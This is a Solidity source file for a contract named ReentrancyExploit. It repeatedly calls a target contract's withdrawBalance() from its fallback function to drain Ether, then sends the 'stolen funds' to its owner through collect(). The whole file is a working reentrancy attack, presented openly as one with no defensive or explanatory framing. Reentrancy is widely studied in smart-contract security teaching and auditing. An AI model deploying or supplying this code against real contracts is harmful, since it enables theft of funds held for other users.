pragma solidity ^0.5.0;

interface IVulnerable {
    function withdrawBalance() external;
}

contract ReentrancyExploit {
    address payable public owner;
    IVulnerable public vulnerableContract;
    bool public attackInProgress = false;

    constructor(address _vulnerableAddress) public {
        owner = msg.sender;
        vulnerableContract = IVulnerable(_vulnerableAddress);
    }

    // Fallback function to receive Ether and re-enter
    function() external payable {
        if (attackInProgress) {
            // Re-enter as long as the vulnerable contract still sends Ether
            vulnerableContract.withdrawBalance();
        }
    }

    // Initiate attack by triggering first withdrawal
    function attack() external {
        attackInProgress = true;
        vulnerableContract.withdrawBalance();
    }

    // Withdraw stolen funds to attacker
    function collect() external {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    // Accept Ether from funding (simulating a deposit)
    function fundExploit() public payable {}
}

